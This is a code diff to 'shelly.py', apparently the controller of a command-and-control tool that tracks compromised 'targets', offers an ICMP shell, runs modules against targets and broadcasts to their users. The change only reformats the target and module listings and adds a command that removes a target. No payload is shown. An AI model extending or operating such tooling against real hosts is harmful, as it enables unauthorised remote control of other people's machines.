@@ -5,6 +5,7 @@
 from scapy.all import sniff
 import base64
 from shellylib import Host
+from columnar import columnar
 from tinydb import TinyDB, Query
 import os
 from termcolor import colored
@@ -35,21 +36,23 @@ class Controller(Host):
         targets = self.db.all()
         targets = sorted(targets, key=lambda d: d['id'])
 
-        response += "  ID  IP\t      Status\t Location\n"
-        response += "  --  --------------  ---------  -----------------\n"
+        headers = ['id', 'ip', 'status', 'location']
+        data = []
         for target in targets:
-            response += f"  {target['number']}   {target['ip']}  {target['status']}  {target['location']}\n"
+            data.append([target['number'], target['ip'], target['status'], target['location']])
+        response += columnar(data, headers, no_borders=True)
         
         response += "\n[ Available Modules ]\n\n"
-        response += "  Name\t\tDescription\n"
-        response += "  ----\t\t-------------------------------\n"
+        headers = ['name', 'description']
+        data = []
         for module in os.listdir('./modules'):
             with open(f"./modules/{module}","r") as file:
                 for line in file.readlines():
                     if line.startswith("# DESCRIPTION:"):
                         desc = (line[14:]).strip()
-            response += f"  {module.split('.')[0]}\t{desc}\n"
-
+            data.append([module.split('.')[0], desc])
+        response += columnar(data, headers, no_borders=True)
+        
         return response
 
     def sniffing(self, target_ip):
@@ -98,9 +101,10 @@ def main():
     controller = Controller()
     parser = ArgumentParser(
                     prog='shelly.py')
-    parser.add_argument('command', choices=["ls", "interact", "run", "broadcast"], help='The command to execute')
+    parser.add_argument('command', choices=["ls", "rm", "interact", "run", "broadcast"], help='The command to execute')
     parser.set_commands_help({
         'ls': '\tList connected targets',
+        'rm': '\tRemove a target',
         'interact': 'Interact with a specified target using the ICMP shell',
         'run': '\tRuns an included module against a specified target or all targets',
         'broadcast': 'Broadcasts a message to all users on all targets',
@@ -119,6 +123,8 @@ def main():
     match args.command:
         case "ls":
             print(controller.list_info())
+        case "rm":
+            print(controller.rm_target(int(args.target)))
         case "interact":
             if args.target == "all":
                 parser.error(f"The command {args.command} can only take one target")
